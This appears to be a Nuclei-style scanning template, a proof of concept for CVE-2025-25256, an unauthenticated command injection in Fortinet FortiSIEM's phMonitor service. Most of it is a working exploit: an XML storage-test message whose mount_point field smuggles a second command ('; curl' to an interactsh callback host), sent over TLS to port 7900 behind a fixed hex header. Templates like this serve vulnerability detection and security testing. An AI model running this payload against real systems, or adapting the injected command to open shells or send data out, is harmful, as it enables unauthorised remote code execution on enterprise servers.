id: cve-2025-25256-command-injection

info:
  name: Fortinet FortiSIEM - Unauthenticated Command Injection (Proof of Concept)
  author: Jules
  severity: critical
  description: |
    NOTE: This template is a proof of concept and may not be reliable. The exploit requires a dynamic payload length which is hardcoded in this template. This may cause the template to fail depending on the length of the interactsh URL.

    Fortinet FortiSIEM versions 7.3.0 through 7.3.1, 7.2.0 through 7.2.5, 7.1.0 through 7.1.7, 7.0.0 through 7.0.3 and before 6.7.9 are vulnerable to an unauthenticated OS command injection vulnerability in the phMonitor service.
  reference:
    - https://www.fortiguard.com/psirt/FG-IR-25-152
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-25256
    cwe-id: CWE-78
  tags: cve,cve2025,fortinet,fortisiem,rce,unauth,oast

network:
  - inputs:
      - data: "<TEST_STORAGE type=\"nfs\">\n    <server_ip>127.0.0.1</server_ip>\n    <mount_point>/test; curl http://{{interactsh-url}};</mount_point>\n</TEST_STORAGE>\n"

    host: "{{Hostname}}"
    port: 7900
    tls: true

    steps:
      - data: "51000000960000006f201f4000000000{{hex(data)}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
